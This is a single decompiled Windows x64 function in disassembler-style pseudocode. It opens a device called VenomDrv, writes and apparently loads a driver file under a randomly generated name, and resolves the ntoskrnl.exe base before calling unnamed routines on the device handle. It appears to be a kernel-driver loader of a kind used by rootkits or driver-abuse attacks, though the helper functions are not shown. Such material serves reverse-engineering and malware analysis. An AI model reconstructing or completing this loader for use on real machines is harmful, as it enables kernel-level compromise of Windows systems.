int v0; // ebx
  int v1; // eax
  char *FileW; // rax
  int v4; // r8d
  __int64 v5; // rdi
  __int64 v6; // rbx
  const wchar_t *v7; // rcx
  const wchar_t *v8; // rcx
  __int64 v9; // rbx
  __int64 v10; // rax
  void *v11; // rcx
  __int64 v12; // rcx
  char v13; // al
  char v14; // al
  char v15; // al
  wchar_t *FileName[3]; // [rsp+40h] [rbp-48h] BYREF
  unsigned __int64 v17; // [rsp+58h] [rbp-30h]
  void *Block[2]; // [rsp+60h] [rbp-28h] BYREF
  __m128i si128; // [rsp+70h] [rbp-18h]

  v0 = sub_7FF7833B37A2(0LL);
  v1 = sub_7FF7833D0C4A();
  sub_7FF7833BAE30((unsigned int)(v0 * v1));
  FileW = (char *)CreateFileW(L"\\\\.\\VenomDrv", 0, 0, 0LL, 3u, 0x80u, 0LL);
  if ( (unsigned __int64)(FileW - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
  {
    sub_7FF7835B0561(FileW);
    return -1LL;
  }
  xmmword_7FF78333C400 = 0LL;
  xmmword_7FF78333C410 = 0LL;
  xmmword_7FF78333C420 = 0LL;
  xmmword_7FF78333C430 = 0LL;
  xmmword_7FF78333C440 = 0LL;
  xmmword_7FF78333C450 = 0LL;
  dword_7FF78333C460 = 0;
  v4 = (int)sub_7FF7835B5AA6() % 20 + 10;
  v5 = v4;
  if ( v4 > 0 )
  {
    v6 = 0LL;
    do
      *((_BYTE *)&xmmword_7FF78333C400 + v6++) = aAbcdefghijklmn_2[(int)sub_7FF7835B5AA6() % 0x34uLL];
    while ( v6 < v5 );
  }
  sub_7FF782EFFD10(FileName);
  if ( !FileName[2] )
    goto LABEL_27;
  v7 = (const wchar_t *)FileName;
  if ( v17 > 7 )
    v7 = FileName[0];
  wremove(v7);
  if ( !(unsigned __int8)sub_7FF782F076A0(FileName) )
    goto LABEL_27;
  if ( !(unsigned __int8)sub_7FF782F07100(FileName) )
  {
    v8 = (const wchar_t *)FileName;
    if ( v17 > 7 )
      v8 = FileName[0];
    wremove(v8);
    goto LABEL_27;
  }
  v9 = (__int64)CreateFileW(L"\\\\.\\VenomDrv", 0xC0000000, 0, 0LL, 3u, 0x80u, 0LL);
  if ( (unsigned __int64)(v9 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
  {
    v12 = v9;
LABEL_26:
    sub_7FF782F00100(v12);
LABEL_27:
    v9 = -1LL;
    goto LABEL_28;
  }
  si128 = _mm_load_si128((const __m128i *)&xmmword_7FF783258E50);
  strcpy((char *)Block, "ntoskrnl.exe");
  BYTE5(Block[1]) = 0;
  HIWORD(Block[1]) = 0;
  v10 = sub_7FF782F077B0(Block);
  qword_7FF78333C468 = v10;
  if ( si128.m128i_i64[1] > 0xFuLL )
  {
    v11 = Block[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v11 = (void *)*((_QWORD *)Block[0] - 1);
      if ( (unsigned __int64)((char *)Block[0] - (char *)v11 - 8) > 0x1F )
      {
        sub_7FF7835EBD64(v11, si128.m128i_i64[1] + 40);
        __debugbreak();
      }
    }
    j_j_j_free(v11);
    v10 = qword_7FF78333C468;
  }
  v12 = v9;
  if ( !v10 )
    goto LABEL_26;
  v13 = sub_7FF782F01700(v9);
  v12 = v9;
  if ( !v13 )
    goto LABEL_26;
  v14 = sub_7FF782F01E20(v9);
  v12 = v9;
  if ( !v14 )
    goto LABEL_26;
  v15 = sub_7FF782F00930(v9);
  v12 = v9;
  if ( !v15 )
    goto LABEL_26;
  sub_7FF782F00D40(v9);
LABEL_28:
  sub_7FF782F03730(FileName);
  return v9;